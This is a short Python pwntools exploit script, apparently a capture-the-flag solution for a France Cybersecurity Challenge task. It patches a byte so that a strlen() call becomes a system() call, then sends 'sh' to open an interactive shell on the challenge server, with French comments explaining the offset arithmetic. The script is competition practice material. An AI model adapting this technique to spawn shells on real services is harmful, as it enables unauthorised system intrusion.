#!/usr/bin/env python3.8
from pwn import *

r = remote("challenges1.france-cybersecurity-challenge.fr", 4009)

print(r.recvuntil(">>> "))
r.send('0x889\n') # call de strlen() sur la réponse à la question [y/n]
r.send('0x43\n')  # On remplace pas un call system()

# system: 0x004006d0
# strlen: 0x004006c0
# Il y a 16 octets d'écart, donc on ajoute 16 à l'octet modifié
# 0x33 + 16 = 0x43

print(r.recvuntil(">>> "))
r.send("sh\n") # On fait un system("sh") pour avoir un shell
r.interactive()
